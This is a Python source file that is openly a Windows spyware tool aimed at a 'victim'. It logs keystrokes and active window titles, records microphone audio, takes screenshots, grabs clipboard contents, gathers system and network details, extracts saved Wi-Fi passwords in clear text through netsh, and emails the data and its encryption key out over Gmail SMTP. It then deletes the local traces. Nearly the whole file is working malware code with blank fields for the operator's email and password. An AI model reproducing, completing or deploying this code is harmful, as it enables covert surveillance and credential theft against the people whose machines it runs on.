import glob
import logging
import os
import platform
import subprocess
import psutil
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from cryptography.fernet import  Fernet
import win32clipboard
import time as t
from datetime import datetime
from threading import Thread
import sounddevice as sd
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from requests import get
from scipy.io.wavfile import write
from win32gui import GetWindowText, GetForegroundWindow


#initilizing files needed to store victim's data
log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s')
file_path = os.path.dirname("")  #enter filepath
slash = "\\"
sys_dir = "sys.txt"
clpbrd_dir = "clpbrd.txt"
audio_dir = "audio.wav"
logg_dir = file_path+ slash + "key_log.txt"

#duration of microphone recording set to 120 seconds
microphone_time = 20

#email functionality, enter required details
disp_email = ""
pw = ""


#new files holding victim's data after encryption
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"


def send_email(filename, attachment, disp_email):

    fromaddr = disp_email
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = disp_email
    msg['Subject'] = filename
    current_time = datetime.now().strftime("%Y-%b-%d [ %H:%M:%S.%f ]")
    body = str(current_time)
    msg.attach(MIMEText(body, 'plain'))

    #attachment

    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, pw)
    text = msg.as_string()
    s.sendmail(fromaddr, disp_email, text)
    s.quit()


def encrypt(filename1, filename2, key):
    f = Fernet(key)
    with open(filename1, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename2, "wb") as file:
        file.write(encrypted_data)


#generating and saving encryption key
key = Fernet.generate_key()
key_file = "key.key"
with open(file_path + slash + key_file, "wb") as f:
    f.write(key)
with open(file_path + slash + key_file, "rb") as f:
    key = f.read()
    send_email(file_path + slash + key_file, file_path + slash + key_file, disp_email)


#used to standardize the numerical information of computer system
def get_size(byte, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if byte < factor:
            return f"{byte:.2f}{unit}{suffix}"
        byte /= factor


def comp_info():
    with open(file_path + slash + sys_dir, "a") as f:
        uname = platform.uname()
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        f.write('\n' + '\n' + f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}" + '\n')
        f.write(f"System: {uname.system}" + '\n')
        f.write(f"Node Name: {uname.node}" + '\n')
        f.write(f"Release: {uname.release}" + '\n')
        f.write(f"Version: {uname.version}" + '\n')
        f.write(f"Machine: {uname.machine}" + '\n')
        f.write(f"Processor: {uname.processor}" + '\n')

        vmem = psutil.virtual_memory()
        f.write(f"Total: {get_size(vmem.total)}" + '\n')
        f.write(f"Available: {get_size(vmem.available)}" + '\n')
        f.write(f"Used: {get_size(vmem.used)}" + '\n')
        f.write(f"Percentage: {vmem.percent}%" + '\n')

        swap = psutil.swap_memory()
        f.write(f"Swap Total: {get_size(swap.total)}" + '\n')
        f.write(f"Swap Free: {get_size(swap.free)}" + '\n')
        f.write(f"Swap Used: {get_size(swap.used)}" + '\n')
        f.write(f"Swap Percentage: {swap.percent}%" + '\n')

        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                f.write("{:<30}|  {:<}".format(i, results[0]))
            except IndexError:
                f.write("{:<30}|  {:<}".format(i, ""))
        if_addrs = psutil.net_if_addrs()
        try:
            ip = get('https://api.ipify.org').text
            f.write('\n' + 'Public IP address is: {}'.format(ip) + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address ")
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                f.write(f"Interface: {interface_name} " + '\n')
                if str(address.family) == 'AddressFamily.AF_INET':
                    f.write(f"  IP Address: {address.address}" + '\n')
                    f.write(f"  Netmask: {address.netmask}" + '\n')
                    f.write(f"  Broadcast IP: {address.broadcast}" + '\n')
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    f.write(f"  MAC Address: {address.address}" + '\n')
                    f.write(f"  Netmask: {address.netmask}" + '\n')
                    f.write(f"  Broadcast MAC: {address.broadcast}" + '\n')

        net_io = psutil.net_io_counters()
        f.write(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}" + '\n')
        f.write(f"Total Bytes Received: {get_size(net_io.bytes_recv)}" + '\n')
        encrypt(file_path+slash+sys_dir, file_path+slash+system_information_e, key)
        send_email(file_path + slash + system_information_e, file_path + slash + system_information_e, disp_email)


def clipboard():
    with open(file_path + slash + clpbrd_dir, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except Exception:
            f.write("Clipboard could not be copied")

        encrypt(file_path+slash+clpbrd_dir, file_path+slash+clipboard_information_e, key)
        send_email(file_path + slash + clipboard_information_e, file_path + slash + clipboard_information_e, disp_email)


#clipboard()


def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + slash + audio_dir, fs, myrecording)
    send_email(file_path + slash + audio_dir, file_path + slash + audio_dir, disp_email)
#microphone()


def screenshot():
    for x in range(0,5):
        ss_time = datetime.now().strftime("%Y_%b_%d_%H_%M_%S_%f")
        im = ImageGrab.grab()
        im.save(file_path + slash + "ss{}.png".format(ss_time))
        send_email(file_path + slash + "ss" + ss_time + ".png", file_path + slash + "ss" + ss_time + ".png", disp_email)
        t.sleep(2)


#screenshot()


def on_press(key):
    logging.info(str(key) + " pressed")


def check_window():
    current_title = None
    while True:
        moment2 = datetime.now().strftime("%Y-%b-%d [ %H:%M:%S.%f ]")
        new_title = GetWindowText(GetForegroundWindow())
        if new_title != current_title and len(new_title) > 0:
            current_title = new_title
            logging.warning(str(moment2) + " : " + "User switched to : " + str(new_title))


def key_listen():
    with Listener(on_press=on_press) as listener:
        def time_out(period_sec: int):
            t.sleep(period_sec)  # Listen to keyboard for period_sec seconds
            listener.stop()
        Thread(target=time_out, args=(50,)).start()
        listener.join()


def main():
    Thread(target=check_window).start()
    Thread(target=key_listen).start()
    Thread(target=screenshot).start()
    Thread(target=microphone).start()
    Thread(target=clipboard).start()
    Thread(target=comp_info).start()
    t.sleep(60)
    encrypt(logg_dir, file_path+slash+keys_information_e, key)
    send_email(file_path+slash+keys_information_e, file_path+slash+keys_information_e, disp_email)


main()


def delete():
    t.sleep(60)
    os.remove(file_path + slash + "sys.txt")
    os.remove(file_path + slash + "clpbrd.txt")
    os.remove(file_path + slash + "key_log.txt")
    os.remove(file_path + slash + "audio.wav")
    for filename in glob.glob(file_path + slash + "ss*"):
        os.remove(filename)


delete()


